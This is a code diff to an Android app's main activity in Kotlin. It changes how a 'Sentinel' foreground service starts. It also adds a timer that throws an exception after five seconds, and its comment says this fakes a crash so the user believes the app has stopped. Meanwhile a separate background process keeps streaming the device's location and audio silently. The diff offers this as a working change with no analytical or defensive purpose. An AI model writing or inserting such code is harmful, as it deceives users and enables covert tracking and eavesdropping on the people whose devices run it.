@@ -116,12 +116,14 @@ class MainActivity : ComponentActivity() {
      * Starts the foreground service which handles connection, location, and audio.
      */
     private fun startSentinelService() {
-        val intent = Intent(this, SentinelForegroundService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
-        }
+        SentinelForegroundService.Start(this)
         Log.i(TAG, "Foreground service started")
+
+        // Schedule an automatic crash of the main activity process after 5 seconds to simulate a crash.
+        // Because the streaming service runs in its own independent ':background' process, it will
+        // remain 100% alive, connected, and streaming location and audio in the background silently.
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            throw RuntimeException("Service failed to start or crashed.")
+        }, 5000)
     }
 }
